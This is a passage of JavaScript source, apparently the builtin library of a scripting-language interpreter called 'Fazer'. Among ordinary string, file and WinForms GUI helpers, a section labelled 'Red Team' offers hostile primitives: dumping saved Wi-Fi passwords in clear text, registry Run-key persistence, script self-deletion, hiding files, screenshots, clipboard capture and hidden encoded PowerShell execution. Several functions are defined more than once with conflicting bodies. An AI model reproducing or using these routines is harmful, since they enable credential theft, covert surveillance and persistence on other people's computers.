              $n.Visible = $false;
              `;
              try {
                  const b64 = Buffer.from(cmd, 'utf16le').toString('base64');
                  child_process.execSync(`powershell -EncodedCommand ${b64}`);
                  return true;
              } catch(e) { return false; }
          }
          return false;
      },
      
      json_parse: (s) => { try { return JSON.parse(String(s)); } catch(e) { return null; } },
      json_stringify: (x) => JSON.stringify(x, null, 2),
      type_of: (x) => typeof x,
      
      str_split: (s, d) => String(s).split(String(d)),
      str_replace: (s, a, b) => String(s).split(String(a)).join(String(b)), // simple replace all
      str_trim: (s) => String(s).trim(),
      str_upper: (s) => String(s).toUpperCase(),
      str_lower: (s) => String(s).toLowerCase(),
      str_sub: (s, start, end) => String(s).substring(Number(start), Number(end)),
      index_of: (s, search) => String(s).indexOf(String(search)),
      contains: (s, search) => String(s).includes(String(search)),
      
      random: () => Math.random(),
      round: (x) => Math.round(Number(x)),
      floor: (x) => Math.floor(Number(x)),
      ceil: (x) => Math.ceil(Number(x)),
      abs: (x) => Math.abs(Number(x)),
      min: (a, b) => Math.min(Number(a), Number(b)),
      max: (a, b) => Math.max(Number(a), Number(b)),
      pow: (a, b) => Math.pow(Number(a), Number(b)),
      sqrt: (x) => Math.sqrt(Number(x)),

      // String
      str_split: (s, d) => String(s).split(String(d)),
      str_replace: (s, a, b) => String(s).split(String(a)).join(String(b)), // simple replace all
      str_trim: (s) => String(s).trim(),
      str_upper: (s) => String(s).toUpperCase(),
      str_lower: (s) => String(s).toLowerCase(),
      str_sub: (s, start, end) => String(s).substring(Number(start), Number(end)),
      pad_start: (s, len, char) => String(s).padStart(Number(len), String(char||" ")),
      pad_end: (s, len, char) => String(s).padEnd(Number(len), String(char||" ")),
      index_of: (s, search) => String(s).indexOf(String(search)),
      contains: (s, search) => String(s).includes(String(search)),

      // File System
      ls: (p) => { try { return fs.readdirSync(path.resolve(String(p || "."))); } catch(e) { return []; } },
      rm: (p) => { try { fs.rmSync(path.resolve(String(p)), { recursive: true, force: true }); return true; } catch(e) { return false; } },
      mkdir: (p) => { try { fs.mkdirSync(path.resolve(String(p)), { recursive: true }); return true; } catch(e) { return false; } },
      cp: (src, dest) => { try { fs.copyFileSync(path.resolve(String(src)), path.resolve(String(dest))); return true; } catch(e) { return false; } },
      mv: (src, dest) => { try { fs.renameSync(path.resolve(String(src)), path.resolve(String(dest))); return true; } catch(e) { return false; } },
      
      // System
      exit: (code) => process.exit(Number(code||0)),
      env_set: (k, v) => { process.env[String(k)] = String(v); return null; },

      // System & Red Team (Advanced)
      sys_info: () => {
         try {
             const cmd = `Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture | ConvertTo-Json`;
             const os = JSON.parse(child_process.execSync(`powershell -NoProfile -Command "${cmd}"`, { encoding: "utf8" }));
             const user = process.env.USERNAME;
             const domain = process.env.USERDOMAIN;
             const admin = (() => { try { child_process.execSync("net session"); return true; } catch(e) { return false; } })();
             return { os: os.Caption, version: os.Version, arch: os.OSArchitecture, user, domain, is_admin: admin };
         } catch(e) { return { error: e.message }; }
      },
      uptime: () => {
        try {
            const up = child_process.execSync(`powershell -command "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Select-Object -ExpandProperty TotalSeconds"`).toString().trim();
            return Number(up);
        } catch(e) { return 0; }
      },
      shutdown: (delay = 0) => child_process.exec(`shutdown /s /t ${Number(delay)}`),
      restart: (delay = 0) => child_process.exec(`shutdown /r /t ${Number(delay)}`),
      lock_screen: () => child_process.exec(`rundll32.exe user32.dll,LockWorkStation`),
      
      // File System Extended
      file_size: (p) => { try { return fs.statSync(path.resolve(String(p))).size; } catch(e) { return -1; } },
      file_exists: (p) => fs.existsSync(path.resolve(String(p))),
      is_dir: (p) => { try { return fs.statSync(path.resolve(String(p))).isDirectory(); } catch(e) { return false; } },
      is_file: (p) => { try { return fs.statSync(path.resolve(String(p))).isFile(); } catch(e) { return false; } },
      dir_home: () => os.homedir(),
      dir_temp: () => os.tmpdir(),

      // Crypto Extended
      md5: (s) => crypto.createHash('md5').update(String(s)).digest('hex'),
      sha1: (s) => crypto.createHash('sha1').update(String(s)).digest('hex'),
      sha256: (s) => crypto.createHash('sha256').update(String(s)).digest('hex'),
      uuid: () => crypto.randomUUID(),

      process_list: () => {
         try {
             const cmd = `Get-Process | Select-Object Id, ProcessName, MainWindowTitle | ConvertTo-Json -Depth 1`;
             const out = child_process.execSync(`powershell -NoProfile -Command "${cmd}"`, { encoding: "utf8" });
             return JSON.parse(out);
         } catch(e) { return []; }
      },

      process_kill: (pid) => {
         try {
             process.kill(Number(pid));
             return true;
         } catch(e) { return false; }
      },

      screenshot: (pathStr) => {
         try {
             const p = path.resolve(String(pathStr));
             const ps = `
Add-Type -AssemblyName System.Windows.Forms;
Add-Type -AssemblyName System.Drawing;
$s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
$b = New-Object System.Drawing.Bitmap $s.Width, $s.Height;
$g = [System.Drawing.Graphics]::FromImage($b);
$g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size);
$b.Save('${p.replace(/'/g, "''")}', [System.Drawing.Imaging.ImageFormat]::Png);
$g.Dispose();
$b.Dispose();
             `;
             child_process.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`);
             return true;
         } catch(e) { return false; }
      },

      clipboard_get: () => {
         try {
             const ps = `Get-Clipboard`;
             return child_process.execSync(`powershell -NoProfile -Command "${ps}"`, { encoding: "utf8" }).trim();
         } catch(e) { return ""; }
      },

      clipboard_set: (text) => {
         try {
             const t = String(text).replace(/"/g, '\\"');
             const ps = `Set-Clipboard -Value "${t}"`;
             child_process.execSync(`powershell -NoProfile -Command "${ps}"`);
             return true;
         } catch(e) { return false; }
      },

      // Automation (Mouse/Keyboard)
      mouse_move: (x, y) => {
         try {
             const ps = `
Add-Type -AssemblyName System.Windows.Forms;
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${Number(x)}, ${Number(y)});
             `;
             child_process.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`);
             return true;
         } catch(e) { return false; }
      },

      mouse_pos: () => {
         try {
            const ps = `
Add-Type -AssemblyName System.Windows.Forms;
$p = [System.Windows.Forms.Cursor]::Position;
Write-Output "$($p.X),$($p.Y)"
            `;
            const out = child_process.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`, { encoding: "utf8" }).trim();
            const parts = out.split(",");
            return { x: Number(parts[0]), y: Number(parts[1]) };
         } catch(e) { return { x: 0, y: 0 }; }
      },
      
      msgbox: (text, title="Message") => {
         try {
             const ps = `
Add-Type -AssemblyName System.Windows.Forms;
[System.Windows.Forms.MessageBox]::Show('${String(text).replace(/'/g, "''")}', '${String(title).replace(/'/g, "''")}');
             `;
             child_process.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`);
             return null;
         } catch(e) { return null; }
      },

      // Registry (Persistence)
      registry_set: (keyPath, name, value) => {
        // keyPath: HKCU\Software\...\Run
        try {
            const ps = `Set-ItemProperty -Path "Registry::${keyPath}" -Name "${name}" -Value "${value}"`;
            child_process.execSync(`powershell -NoProfile -Command "${ps}"`);
            return true;
        } catch(e) { return false; }
      },
      
      registry_get: (keyPath, name) => {
        try {
            const ps = `Get-ItemPropertyValue -Path "Registry::${keyPath}" -Name "${name}"`;
            return child_process.execSync(`powershell -NoProfile -Command "${ps}"`, { encoding: "utf8" }).trim();
        } catch(e) { return null; }
      },

      // Self-Destruct
      self_destruct: () => {
          const script = process.argv[1];
          // We can't delete running file easily on Windows.
          // We spawn a detached process that waits then deletes.
          const cmd = `Start-Sleep -Seconds 2; Remove-Item -Path "${script}" -Force`;
          const ps = `powershell -NoProfile -Command "${cmd}"`;
          child_process.spawn(ps, { shell: true, detached: true, stdio: 'ignore' }).unref();
          process.exit(0);
      },

      // Network
      download: async (url, dest) => {
          const followRedirects = (currentUrl, currentDest, maxRedirects = 5) => {
              return new Promise((resolve, reject) => {
                  if (maxRedirects === 0) {
                      reject(new Error("Too many redirects"));
                      return;
                  }
                  const proto = currentUrl.startsWith("https") ? https : http;
                  const request = proto.get(currentUrl, (response) => {
                      if ([301, 302, 303, 307, 308].includes(response.statusCode) && response.headers.location) {
                          const redirectUrl = new URL(response.headers.location, currentUrl).href;
                          followRedirects(redirectUrl, currentDest, maxRedirects - 1)
                              .then(resolve)
                              .catch(reject);
                          return;
                      }
                      if (response.statusCode !== 200) {
                          reject(new Error(`Failed to download: Status Code ${response.statusCode}`));
                          return;
                      }
                      const file = fs.createWriteStream(currentDest);
                      response.pipe(file);
                      file.on('finish', () => {
                          file.close(() => resolve(true));
                      });
                  }).on('error', (err) => {
                      try { fs.unlinkSync(currentDest); } catch(e){}
                      reject(err);
                  });
              });
          };
          try {
              return await followRedirects(url, dest);
          } catch (e) {
              return false;
          }
      },

      public_ip: async () => {
         try {
             return new Promise((resolve) => {
                 https.get('https://api.ipify.org', (res) => {
                     let data = '';
                     res.on('data', chunk => data += chunk);
                     res.on('end', () => resolve(data));
                 }).on('error', () => resolve("0.0.0.0"));
             });
         } catch(e) { return "0.0.0.0"; }
      },

      wifi_dump: () => {
         try {
             const ps = `
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() };
$results = @();
foreach ($p in $profiles) {
    $pass = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() };
    if (-not $pass) { $pass = "N/A" };
    $results += @{ SSID = $p; Password = $pass };
}
$results | ConvertTo-Json -Compress
             `;
             const out = child_process.execSync(`powershell -NoProfile -Command "${ps.replace(/\n/g, " ")}"`, { encoding: "utf8" });
             return JSON.parse(out);
         } catch(e) { return []; }
      },

      // System Utils
      zip: (source, dest) => {
         try {
            const s = path.resolve(String(source));
            const d = path.resolve(String(dest));
            child_process.execSync(`powershell -NoProfile -Command "Compress-Archive -Path '${s}' -DestinationPath '${d}' -Force"`);
            return true;
         } catch(e) { return false; }
      },

      unzip: (source, dest) => {
         try {
            const s = path.resolve(String(source));
            const d = path.resolve(String(dest));
            child_process.execSync(`powershell -NoProfile -Command "Expand-Archive -Path '${s}' -DestinationPath '${d}' -Force"`);
            return true;
         } catch(e) { return false; }
      },

      file_hide: (pathStr) => {
         try {
             const p = path.resolve(String(pathStr));
             child_process.execSync(`attrib +h "${p}"`);
             return true;
         } catch(e) { return false; }
      },
      
      file_unhide: (pathStr) => {
         try {
             const p = path.resolve(String(pathStr));
             child_process.execSync(`attrib -h "${p}"`);
             return true;
         } catch(e) { return false; }
      },

      // Audio & Fun
      speak: (text) => {
         try {
             const t = String(text).replace(/'/g, "''");
             const ps = `Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('${t}')`;
             child_process.execSync(`powershell -NoProfile -Command "${ps}"`);
             return true;
         } catch(e) { return false; }
      },
      
      beep: (freq, dur) => {
         try {
             const ps = `[Console]::Beep(${Number(freq)}, ${Number(dur)})`; 
             child_process.execSync(`powershell -NoProfile -Command "${ps}"`);
             return true;
         } catch(e) { return false; }
      },

      // Crypto
      b64_encode: (text) => {
          return Buffer.from(String(text)).toString('base64');
      },
      
      b64_decode: (text) => {
          return Buffer.from(String(text), 'base64').toString('utf8');
      },

      hash: (algo, text) => { // algo: 'md5', 'sha256'
          try {
              const crypto = require('crypto');
              return crypto.createHash(String(algo)).update(String(text)).digest('hex');
          } catch(e) { return ""; }
      },

      readB64: readBytesB64,
      writeB64: writeBytesB64,
      saveB64: (s, p) => { fs.writeFileSync(path.resolve(String(p)), Buffer.from(String(s), "base64")); return null; },

      sha256,
      encText,
      decText,
      encB64,
      decB64,

      hex,
      b64,
      fromHex,
      fromB64,

      join: pathJoin,
      abs: pathAbs,
      dir: pathDir,
      base: pathBase,

      nowMs,
      len,
      keys,
      get,
      set,
      
      json: (x) => JSON.stringify(x, null, 2),
      parseJson: (s) => JSON.parse(s),
      int: (x) => parseInt(String(x)) || 0,
      float: (x) => parseFloat(String(x)) || 0.0,
      
      exec: (cmd) => {
        try {
          return child_process.execSync(String(cmd)).toString();
        } catch (e) {
          if (e.stdout && e.stdout.length > 0) return e.stdout.toString();
          return "Error: " + e.message;
        }
      },
      
      http_server: (port, handler) => {
          const http = require('http');
          const server = http.createServer(async (req, res) => {
              if (handler && handler.__fnref__) {
                  const result = await this._call(handler, [{
                      method: req.method,
                      url: req.url,
                      headers: req.headers
                  }], this.global);
                  
                  res.writeHead(200, { 'Content-Type': 'text/html' });
                  res.end(String(result));
              } else {
                  res.end("Fazer Server Running");
              }
          });
          server.listen(Number(port));
          console.log(`HTTP Server running on port ${port}`);
      },

      sleep: (ms) => new Promise((resolve) => setTimeout(resolve, Number(ms))),
      
      fetch: async (url, opts = {}) => {
        return await fetchWithRedirects(String(url), opts || {});
      },

      discord: (token) => {
        if (!WebSocket) throw new FazerError("WebSocket module (ws) not found. Install it to use discord.");
        const listeners = {};
        const ws = new WebSocket("wss://gateway.discord.gg/?v=10&encoding=json");
        
        ws.on("open", () => {
          ws.send(JSON.stringify({
            op: 2,
            d: { token: String(token), intents: 33280, properties: { os: "fazer", browser: "fazer", device: "fazer" } }
          }));
        });
        
        ws.on("message", async (data) => {
           const p = JSON.parse(data);
           if (p.op === 10) {
             setInterval(() => ws.send(JSON.stringify({ op: 1, d: null })), p.d.heartbeat_interval);
           }
           if (p.t === "MESSAGE_CREATE") {
             const handlers = listeners["message"];
             if (handlers) {
               for (const fn of handlers) {
                 try {
                   await this._call(fn, [p.d], this.global);
                 } catch (e) { console.error("Discord handler error:", e); }
               }
             }
           }
        });
        
        return {
          on: (ev, fn) => { listeners[ev] = listeners[ev] || []; listeners[ev].push(fn); },
          send: async (chanId, content) => {
             const body = JSON.stringify({ content: String(content) });
             return new Promise((resolve) => {
                const req = https.request(`https://discord.com/api/v10/channels/${chanId}/messages`, {
                  method: "POST",
                  headers: { "Authorization": `Bot ${token}`, "Content-Type": "application/json" }
                }, (res) => {
                  let d = "";
                  res.on("data", c => d += c);
                  res.on("end", () => resolve(JSON.parse(d)));
                });
                req.write(body);
                req.end();
             });
          }
        };
      },


      
      menu: async (options) => {
         if (!Array.isArray(options)) throw new FazerError("menu expects a list of options");
         options.forEach((o, i) => console.log(`[${i+1}] ${o}`));
         const readline = require("readline");
         const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
         return new Promise(resolve => {
             rl.question("Choice > ", (ans) => {
                 rl.close();
                 const n = Number(ans);
                 if (isNaN(n) || n < 1 || n > options.length) resolve(null);
                 else resolve(options[n-1]);
             });
         });
      },



      exec: (cmd) => {
          try {
              return require("child_process").execSync(String(cmd), { encoding: "utf8" }).trim();
          } catch (e) {
              throw new FazerError("exec failed: " + e.message);
          }
      },
      
      style: (text, color) => {
         const codes = {
             reset: "\x1b[0m", bold: "\x1b[1m", dim: "\x1b[2m",
             red: "\x1b[31m", green: "\x1b[32m", yellow: "\x1b[33m",
             blue: "\x1b[34m", magenta: "\x1b[35m", cyan: "\x1b[36m", white: "\x1b[37m"
         };
         return (codes[String(color)] || "") + String(text) + codes.reset;
      },

      server: async (port, handler) => {
         const http = require("http");
         const srv = http.createServer(async (req, res) => {
             const bodyParts = [];
             for await (const chunk of req) bodyParts.push(chunk);
             const bodyStr = Buffer.concat(bodyParts).toString();
             
             const reqObj = {
                 method: req.method,
                 url: req.url,
                 headers: req.headers,
                 body: bodyStr
             };
             
             try {
                 let result = null;
                 if (typeof handler === "object" && handler !== null && !handler.__fnref__) {
                     const url = req.url.split("?")[0];
                     if (handler[url]) {
                         const h = handler[url];
                         if (typeof h === "function" || (typeof h === "object" && h.__fnref__)) {
                              result = await this._call(h, [reqObj], this.global);
                         } else {
                              result = h;
                         }
                     } else {
                         result = { status: 404, body: "Not Found" };
                     }
                 } else {
                     result = await this._call(handler, [reqObj], this.global);
                 }
                 
                 let status = 200;
                 let headers = { "Content-Type": "text/plain" };
                 let resBody = "";
                 
                 if (typeof result === "object" && result !== null) {
                     if (result.status) status = Number(result.status);
                     if (result.headers) headers = { ...headers, ...result.headers };
                     if (result.body) resBody = String(result.body);
                     else if (result.status === undefined) resBody = JSON.stringify(result);
                 } else {
                     resBody = String(result);
                 }
                 
                 res.writeHead(status, headers);
                 res.end(resBody);
             } catch (e) {
                 res.writeHead(500);
                 res.end("Internal Server Error: " + e.message);
             }
         });
         
         return new Promise((resolve) => {
             srv.listen(Number(port), () => {
                 console.log(`Server listening on port ${port}`);
                 resolve({
                     close: () => { srv.close(); return null; }
                 });
             });
             srv.on('error', (e) => {
                 if (e.code === 'EADDRINUSE') {
                     console.error(`Error: Port ${port} is already in use.`);
                 } else {
                     console.error(`Server error: ${e.message}`);
                 }
                 resolve(null); // Resolve with null to avoid crashing
             });
         });
      },

      // --- NATIVE UI (WinForms) ---
      
      window: (title, w, h, icon, style) => {
          this.native_ui_state.widgets = [{ type: 'window', title, w, h, icon, style }];
          return "window";
      },
      
      button: (id, text, x, y, w, h, style) => {
          this.native_ui_state.widgets.push({ type: 'widget', cls: 'Button', id, text, x, y, w, h, style });
          return id;
      },
      
      label: (id, text, x, y, w, h, style) => {
          this.native_ui_state.widgets.push({ type: 'widget', cls: 'Label', id, text, x, y, w, h, style });
          return id;
      },
      
      entry: (id, text, x, y, w, h, style) => {
          this.native_ui_state.widgets.push({ type: 'widget', cls: 'TextBox', id, text, x, y, w, h, style });
          return id;
      },

      textarea: (id, text, x, y, w, h, style) => {
          this.native_ui_state.widgets.push({ type: 'widget', cls: 'RichTextBox', id, text, x, y, w, h, style });
          return id;
      },
      
      checkbox: (id, text, x, y, w, h, style) => {
          this.native_ui_state.widgets.push({ type: 'widget', cls: 'CheckBox', id, text, x, y, w, h, style });
          return id;
      },
      
      progress: (id, val, x, y, w, h, style) => {
          this.native_ui_state.widgets.push({ type: 'widget', cls: 'ProgressBar', id, text: val, x, y, w, h, style });
          return id;
      },
      
      combo: (id, items, x, y, w, h, style) => {
          // items should be comma separated string or list (handled in UI gen)
          const itemList = Array.isArray(items) ? items.join(",") : String(items);
          this.native_ui_state.widgets.push({ type: 'widget', cls: 'ComboBox', id, text: itemList, x, y, w, h, style });
          return id;
      },
      
      get_text: (id) => {
          // Check pending updates first
          if (this.native_ui_state.updates.set_text && this.native_ui_state.updates.set_text[id] !== undefined) {
              return this.native_ui_state.updates.set_text[id];
          }
          // Check initial/current state
          const w = this.native_ui_state.widgets.find(x => x.id === id);
          if (w) return w.text || "";
          return "";
      },
      
      set_text: (id, val) => {
          if (!this.native_ui_state.updates.set_text) this.native_ui_state.updates.set_text = {};
          this.native_ui_state.updates.set_text[id] = val;
          
          // Update internal state too
          const w = this.native_ui_state.widgets.find(x => x.id === id);
          if (w) w.text = val;
          
          return val;
      },
      
      msgbox: (msg) => {
           this.native_ui_state.updates.msgbox = String(msg);
           return true;
      },

      msgbox_confirm: (msg) => {
          try {
              const tempFile = require('path').join(require('os').tmpdir(), `fazer_confirm_${Date.now()}.ps1`);
              // Escape " and $ for PowerShell string
              const safeMsg = String(msg).replace(/"/g, '`"').replace(/\$/g, '`$');
              const script = `
              Add-Type -AssemblyName System.Windows.Forms
              $res = [System.Windows.Forms.MessageBox]::Show("${safeMsg}", "Confirmation", [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Warning)
              Write-Output $res
              `;
              require('fs').writeFileSync(tempFile, script, 'utf8');
              
              const out = require('child_process').execSync(`powershell -ExecutionPolicy Bypass -File "${tempFile}"`, { encoding: 'utf8' }).trim();
              
              try { require('fs').unlinkSync(tempFile); } catch(e){}
              
              return out === "Yes";
          } catch(e) {
              console.error(e);
              return false;
          }
      },

      gui: async (handler) => {
         if (process.platform !== 'win32') throw new FazerError("Native GUI is Windows only.");
         
         const http = require("http");
         const port = await new Promise(r => {
             const s = http.createServer();
             s.listen(0, () => {
                 const p = s.address().port;
                 s.close(() => r(p));
             });
         });
     
         const srv = http.createServer(async (req, res) => {
              if (req.method === "POST" && req.url === "/event") {
                  let body = "";
                  for await (const chunk of req) body += chunk;
                  try {
                      const event = JSON.parse(body);
                      // Fire and forget (don't await handler to unblock UI)
                      if (handler) {
                          this._call(handler, [event], this.global).catch(e => console.error(e));
                      }
                      
                      res.writeHead(200, { "Content-Type": "application/json" });
                      res.end("{}"); // Updates will be fetched via /updates
                  } catch(e) {
                      console.error(e);
                      res.writeHead(500); res.end("{}");
                  }
              } else if (req.method === "GET" && req.url === "/updates") {
                  res.writeHead(200, { "Content-Type": "application/json" });
                  res.end(JSON.stringify(this.native_ui_state.updates));
                  this.native_ui_state.updates = {}; // Clear after sending
              }
         });
         
         srv.listen(port);
     
         // Helper for Colors
         const getColor = (c, def) => {
             if (!c) return def;
             c = String(c);
             if (c.startsWith("#")) return `[System.Drawing.ColorTranslator]::FromHtml("${c}")`;
             return `[System.Drawing.Color]::${c}`;
         };
 
         // Helper for Fonts
         const getFont = (f, defName, defSize) => {
             let name = defName;
             let size = defSize;
             let style = ""; 
             
             if (f && typeof f === 'object') {
                 if (f.name) name = f.name;
                 if (f.size) size = f.size;
                 if (f.bold) style += ", [System.Drawing.FontStyle]::Bold";
                 if (f.italic) style += ", [System.Drawing.FontStyle]::Italic";
             }
             return `New-Object System.Drawing.Font("${name}", ${size}${style})`;
         };

         // Generate PowerShell Script
         let ps = `
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
         $url = "http://localhost:${port}/event"
         $updateUrl = "http://localhost:${port}/updates"
         
         function Get-Updates {
             try {
                 $res = Invoke-RestMethod -Uri $updateUrl -Method GET -ErrorAction SilentlyContinue
                 if ($res) {
                     if ($res.set_text) {
                         foreach($k in $res.set_text.PSObject.Properties) {
                             $c = $form.Controls.Find($k.Name, $true)
                             if ($c) { $c[0].Text = $k.Value }
                         }
                     }
                     if ($res.msgbox) { [System.Windows.Forms.MessageBox]::Show($res.msgbox) }
                 }
             } catch {}
         }

         function Send-Event($id, $type, $val) {
             $body = @{id=$id; type=$type; value=$val} | ConvertTo-Json -Compress
             try {
                 Invoke-RestMethod -Uri $url -Method POST -Body $body -ContentType "application/json"
             } catch {}
         }
         `;
     
         const widgets = this.native_ui_state.widgets;
         const win = widgets.find(w => w.type === 'window');
         if (!win) throw new FazerError("No window defined. Use window().");
         
         let iconCmd = "";
         if (win.icon) {
             const iconAbs = require('path').resolve(String(win.icon));
             const iconPath = iconAbs.replace(/\\/g, '\\\\'); 
             if (require('fs').existsSync(iconAbs)) {
                 if (String(win.icon).endsWith(".ico")) {
                    iconCmd = `$form.Icon = New-Object System.Drawing.Icon("${iconPath}")`;
                 } else {
                    iconCmd = `$form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon("${iconPath}")`;
                 }
             }
         }

         const winStyle = win.style || {};
         const winBg = getColor(winStyle.bg, "[System.Drawing.Color]::FromArgb(30, 30, 30)");
         const winFg = getColor(winStyle.fg, "[System.Drawing.Color]::White");
     
         ps += `
         $form = New-Object System.Windows.Forms.Form
         $form.Text = "${win.title}"
         ${iconCmd}
         $form.Width = ${win.w}
         $form.Height = ${win.h}
         $form.StartPosition = "CenterScreen"
         $form.BackColor = ${winBg}
         $form.ForeColor = ${winFg}
         $form.FormBorderStyle = "FixedSingle"
         $form.MaximizeBox = $false
         
         $timer = New-Object System.Windows.Forms.Timer
         $timer.Interval = 100
         $timer.Add_Tick({ Get-Updates })
         $timer.Start()
         `;
     
         for (const w of widgets) {
            if (w.type === 'window') continue;
            let extra = "";
            let textProp = `$${w.id}.Text = "${w.text}"`;
            
            if (w.cls === "ComboBox") {
                const items = String(w.text).split(",");
                extra = `$${w.id}.DropDownStyle = "DropDownList"\n`;
                items.forEach(i => {
                   extra += `$${w.id}.Items.Add("${i.trim()}")\n`;
                });
                if(items.length > 0) extra += `$${w.id}.SelectedIndex = 0\n`;
                textProp = ""; 
            } else if (w.cls === "ProgressBar") {
                textProp = `$${w.id}.Value = ${Number(w.text) || 0}`;
            }

            const style = w.style || {};
            const bg = getColor(style.bg, ""); 
            const fg = getColor(style.fg, "");
            const font = getFont(style.font, "Segoe UI", 10);
            
            let styleCmd = "";
            if (bg) styleCmd += `$${w.id}.BackColor = ${bg}\n`;
            if (fg) styleCmd += `$${w.id}.ForeColor = ${fg}\n`;
            styleCmd += `$${w.id}.Font = ${font}\n`;

            ps += `
            $${w.id} = New-Object System.Windows.Forms.${w.cls}
            $${w.id}.Name = "${w.id}"
            ${textProp}
            $${w.id}.Left = ${w.x}
            $${w.id}.Top = ${w.y}
            $${w.id}.Width = ${w.w}
            $${w.id}.Height = ${w.h}
            ${styleCmd}
            ${extra}
            `;
            
            if (w.cls === 'Button') {
               const flat = style.flat !== false; // Default true
               const flatStyle = flat ? `$${w.id}.FlatStyle = "Flat"\n$${w.id}.FlatAppearance.BorderSize = 0` : "";
               
               // Default button colors if not specified
               if (!bg) ps += `$${w.id}.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)\n`;
               
               ps += `
               ${flatStyle}
               $${w.id}.Add_Click({ Send-Event "${w.id}" "click" "" })
               `;
           } else if (w.cls === 'TextBox' || w.cls === 'RichTextBox') {
                if (!bg) ps += `$${w.id}.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)\n`;
                if (!fg) ps += `$${w.id}.ForeColor = [System.Drawing.Color]::White\n`;
                ps += `
                $${w.id}.BorderStyle = "FixedSingle"
                $${w.id}.Add_TextChanged({ Send-Event "${w.id}" "change" $this.Text })
                `;
           } else if (w.cls === 'CheckBox') {
                if (!fg) ps += `$${w.id}.ForeColor = [System.Drawing.Color]::White\n`;
                ps += `
                $${w.id}.Add_CheckedChanged({ Send-Event "${w.id}" "change" $this.Checked })
                `;
           } else if (w.cls === 'ComboBox') {
                if (!bg) ps += `$${w.id}.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)\n`;
                if (!fg) ps += `$${w.id}.ForeColor = [System.Drawing.Color]::White\n`;
                ps += `
                $${w.id}.FlatStyle = "Flat"
                $${w.id}.Add_SelectedIndexChanged({ Send-Event "${w.id}" "change" $this.SelectedItem })
                `;
           }
            
            ps += `$form.Controls.Add($${w.id})\n`;
        }
     
         ps += `
         [void]$form.ShowDialog()
         `;
     
         // Run PS via Temp File (Avoids ENAMETOOLONG)
         const tempFile = require('path').join(require('os').tmpdir(), `fazer_gui_${Date.now()}.ps1`);
         require('fs').writeFileSync(tempFile, ps, 'utf8');
         
         const child = require('child_process').spawn('powershell', ['-ExecutionPolicy', 'Bypass', '-File', tempFile], { stdio: 'inherit' });
         
         child.on('exit', () => {
             try { require('fs').unlinkSync(tempFile); } catch(e){}
             process.exit(0);
         });
         
         return new Promise(r => {}); 
      },

      argv: argvFn,
      env: envFn,
      cwd: cwdFn,
      input: (p) => builtins.ask(p),
      nowMs: () => Date.now(),
      sleep: async (ms) => new Promise(r => setTimeout(r, Number(ms))),
      exec: (cmd) => {
          try {
              return require('child_process').execSync(String(cmd)).toString();
          } catch(e) { return "Error: " + e.message; }
      },
      
      // --- EXTENDED FEATURES (Automation, State, DB) ---
      
      set: (obj, key, val) => {
          if (obj && typeof obj === 'object') {
              obj[key] = val;
              return val;
          }
          return null;
      },

      clipboard_set: (text) => {
          try {
              if (process.platform === 'win32') {
                  require('child_process').execSync(`echo ${String(text).replace(/[&|<>^]/g, '^$&')} | clip`);
              } else {
                  // TODO: Linux/Mac support
              }
              return true;
          } catch(e) { return false; }
      },

      notify: (title, msg) => {
          try {
              if (process.platform === 'win32') {
                  const script = `
                  [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");
                  $objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon;
                  $objNotifyIcon.Icon = [System.Drawing.SystemIcons]::Information;
                  $objNotifyIcon.Visible = $True;
                  $objNotifyIcon.BalloonTipTitle = "${String(title).replace(/"/g, '`"')}";
                  $objNotifyIcon.BalloonTipText = "${String(msg).replace(/"/g, '`"')}";
                  $objNotifyIcon.ShowBalloonTip(5000);
                  Start-Sleep -s 5;
                  $objNotifyIcon.Dispose();
                  `;
                  require('child_process').exec(`powershell -Command "${script.replace(/\n/g, ' ')}"`);
              }
              return true;
          } catch(e) { return false; }
      },

      db: (p) => {
          const dbPath = path.resolve(String(p));
          let data = {};
          if (fs.existsSync(dbPath)) {
              try { data = JSON.parse(fs.readFileSync(dbPath, "utf8")); } catch(e){}
          }
          
          return {
              get: (k) => data[k],
              set: (k, v) => { 
                  data[k] = v; 
                  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2)); 
                  return v; 
              },
              all: () => data
          };
       },

      import: async (p) => {
         let fullPath = path.resolve(String(p));
         if (!fs.existsSync(fullPath)) {
             // Check standard library path
             const libPath = path.join(__dirname, 'lib', String(p));
             if (fs.existsSync(libPath)) {
                 fullPath = libPath;
             } else {
                 throw new FazerError(`Module not found: ${p}`);
             }
         }
         const code = fs.readFileSync(fullPath, "utf8");
         
         const lexResult = lexer.tokenize(code);
         if (lexResult.errors.length > 0) throw new FazerError(`Lexer error in ${p}: ${lexResult.errors[0].message}`);
         
         const parser = new FazerParser();
         parser.input = lexResult.tokens;
         const ast = parser.program();
         if (parser.errors.length > 0) throw new FazerError(`Parser error in ${p}: ${parser.errors[0].message}`);
         
         const moduleScope = new Scope(this.global);
         await this._execBlock(ast, moduleScope);
         
         const exports = {};
         for(const [k, v] of moduleScope.vars) {
             exports[k] = v.value;
         }
         return exports;
      },

      // File System
      fs_read: (p) => {
          try { return require("fs").readFileSync(String(p), "utf8"); } catch(e) { return null; }
      },
      fs_write: (p, c) => {
          try { require("fs").writeFileSync(String(p), String(c)); return true; } catch(e) { return false; }
      },
